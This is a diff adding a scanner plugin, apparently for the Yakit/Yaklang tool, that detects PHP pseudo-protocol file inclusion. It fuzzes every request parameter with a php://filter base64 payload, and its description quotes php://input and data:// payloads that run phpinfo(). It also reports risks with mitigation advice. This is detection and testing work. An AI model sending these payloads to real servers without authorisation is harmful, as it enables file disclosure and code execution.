@@ -1,0 +1,70 @@
+descInfo = `PHP pseudo-protocol or pretense protocol is used in PHP to access various I/O flow method is called. They can be used to contain files, access network resources, operate memory data, etc. When it comes to“PHP pseudo-protocol files contain vulnerabilities”, usually refers to the use of some special protocols in PHP (such as php://, data://, file://etc.) to perform a File Inclusion Attack.
+
+This type of vulnerability usually occurs in PHPs include, require, include_once, or require_once statements, which are used to include and run the contents of PHP files or other file types. If these statements do not properly limit the files that can be included, an attacker could exploit this to include malicious files, or execute malicious PHP code via pseudo-protocols.
+
+For example, a PHP application might allow the user to specify files to include via a parameter like this:
+
+    include($_GET['file'] . ".php");
+
+Without proper verification, an attacker can pass a path to a malicious file through URL parameters, or use a pseudo protocol to perform the attack, such as:
+
+    http://example.com/index.php?file=php://input
+
+Attackers can send via POST requests PHP code, which will include base64-encoded PHP code directly in the URL through the php://input stream is included and executed because PHP://input allows the raw POST data to be read.
+
+Additionally, Attackers may also use data://protocol, such as:
+
+    http://example.com/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+
+). The above URL actually contains a base64-encoded string, which is decoded into the<?php phpinfo();?>, which causes the server to execute the phpinfo() function, which displays detailed information about the servers configuration.
+
+hazards include:
+
+1. Remote code execution: An attacker may remotely execute arbitrary code. This is the most serious risk because it may lead to the server being completely controlled.
+2. Information leakage: Attackers can obtain sensitive configuration information, such as database credentials, API keys, etc.
+3. System file access: The attacker may read system files and obtain server information or more sensitive data.
+4. Session Hijacking: An attacker could hijack a users session or perform a cross-site scripting (XSS) attack by including a malicious file.
+`
+
+# mirrorNewWebsitePathParams Each time a new website path appears with some parameters, the parameters pass through common locations and parameter names Deduplication, the first HTTPFlow deduplication is called here. The
+mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
+
+    benchmarkResponse, _, _ = poc.HTTP(req, poc.https(isHttps /*type: bool*/))
+    benchmarkResponse = string(benchmarkResponse)
+
+    for param in freq.GetCommonParams() {
+        originValue = param.GetFirstValue()
+        p = "Vm0w"
+        firstPayload = x`php://filter/{{repeat:str(convert.base64-encode/|10)}}/resource=`[0] + originValue
+        response, err := param.Fuzz(firstPayload).ExecFirst()
+        if err != nil {
+            log.error(err)
+            continue
+        }
+        if p in response.ResponseRaw {
+            risk.NewRisk(
+                url, risk.severity("high"),
+                risk.titleVerbose("PHP pseudo-protocol file containing file: %v" % url),
+                risk.title("PHP Protocol Filter Base64 ReadFile: %v" % url),
+                risk.type("file_include"), risk.type("File Contains Vulnerability"),
+                risk.request(response.RequestRaw), risk.response(response.ResponseRaw),
+                risk.payload(firstPayload), risk.parameter(param.String()),
+                risk.description(descInfo), risk.solution(`
+
+In order to prevent this For this type of vulnerability, developers need to ensure that:
+
+1. All user input is validated and sanitized, and untrusted files are not allowed to be included.
+2. Use appropriate configuration to limit the files that PHP can access.
+3. Disable or limit dangerous PHP functions (such as eval()) and pseudo-protocols (such as allow_url_include configuration items).
+
+PHP pseudo-protocol file inclusion vulnerability is a serious security vulnerability that requires mitigation through coding best practices and server configuration. Check all include/require The use of
+
+`)
+            )
+            continue
+        }
+    }
+}
+
+
